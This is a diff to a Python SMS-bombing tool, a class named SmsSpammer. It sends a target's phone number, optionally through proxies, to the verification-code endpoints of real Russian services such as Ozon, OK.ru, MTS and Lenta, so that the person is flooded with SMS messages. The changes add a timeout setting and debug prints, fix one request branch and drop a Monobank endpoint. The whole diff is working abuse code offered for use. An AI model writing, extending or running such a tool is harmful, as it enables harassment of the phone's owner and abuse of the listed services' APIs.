@@ -8,6 +8,7 @@ class SmsSpammer:
     def __init__(self, phone ):
         self.phoneNumber = self.make7phone(phone)
         self.proxies=None
+        self.timeout=10
 
     def make7phone(self, phone):
             if phone[0] == '+':
@@ -21,13 +22,18 @@ class SmsSpammer:
     def sendSms(self, url, data="", json="", params=""):
         try:
             if data != "":
-                requests.post(url, data, proxies=self.proxies, timeout=10)
+                print('-data') 
+                requests.post(url, data=data, proxies=self.proxies, timeout=self.timeout)
             elif json != "":
-                requests.post(url, json=json, proxies=self.proxies, timeout=10)
+                print('-json') 
+                requests.post(url, json=json, proxies=self.proxies, timeout=self.timeout)
             elif params != "":
-                self.sendSms(url, params=params)
+                print('-params') 
+                requests.post(url, params=params, proxies=self.proxies, timeout=self.timeout)
+            print('-cool') 
         except:
-                pass 
+            print('-timeout') 
+
     def setProxies(self, new_proxies):
         self.proxies = new_proxies
 
@@ -51,7 +57,6 @@ class SmsSpammer:
                 self.sendSms("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": self.phoneNumber, "otpId": 0} )
                 self.sendSms("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+self.phoneNumber} )
                 self.sendSms("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": self.phoneNumber} )
-                self.sendSms("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+"+self.phoneNumber} )
                 self.sendSms("https://moneyman.ru/registration_api/actions/send-confirmation-code",data={"+"+self.phoneNumber} )
                 self.sendSms("https://my.modulbank.ru/api/v2/registration/nameAndPhone",json={"FirstName": self.name, "CellPhone": self.phoneNumber, "Package": "optimal"} )
                 self.sendSms("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+"+self.phoneNumber} )
